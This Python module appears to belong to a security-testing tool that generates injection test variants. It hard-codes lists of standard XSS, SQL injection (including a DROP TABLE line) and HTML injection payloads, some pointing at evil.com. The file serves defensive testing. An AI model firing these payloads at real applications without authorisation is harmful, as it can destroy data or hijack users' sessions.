"""
Security test service for generating injection payloads.
"""
from typing import List, Dict, Any


class SecurityTestService:
    """Service for generating security test variants."""
    
    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
    ]
    
    # SQL injection payloads
    SQL_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "admin'--",
        "' OR 1=1--",
        "' OR 'a'='a",
        "') OR ('1'='1",
        "1' OR '1'='1",
        "admin' OR '1'='1",
        "' OR 1=1#",
    ]
    
    # HTML injection payloads
    HTML_PAYLOADS = [
        "<h1>Test</h1>",
        "<iframe src='http://example.com'></iframe>",
        "<img src='invalid' onerror='alert(1)'>",
        "<div>Test</div>",
        "<p>Test</p>",
        "<script>console.log('test')</script>",
        "<style>body{background:red}</style>",
        "<link rel='stylesheet' href='evil.css'>",
        "<meta http-equiv='refresh' content='0;url=evil.com'>",
        "<object data='evil.swf'></object>",
    ]
    
    @staticmethod
    def generate_xss_variants(original_value: str) -> List[str]:
        """Generate XSS injection variants."""
        return [payload for payload in SecurityTestService.XSS_PAYLOADS]
    
    @staticmethod
    def generate_sql_variants(original_value: str) -> List[str]:
        """Generate SQL injection variants."""
        return [payload for payload in SecurityTestService.SQL_PAYLOADS]
    
    @staticmethod
    def generate_html_variants(original_value: str) -> List[str]:
        """Generate HTML injection variants."""
        return [payload for payload in SecurityTestService.HTML_PAYLOADS]
    
    @staticmethod
    def is_string_field(value: Any) -> bool:
        """Check if value is a string type."""
        return isinstance(value, str)
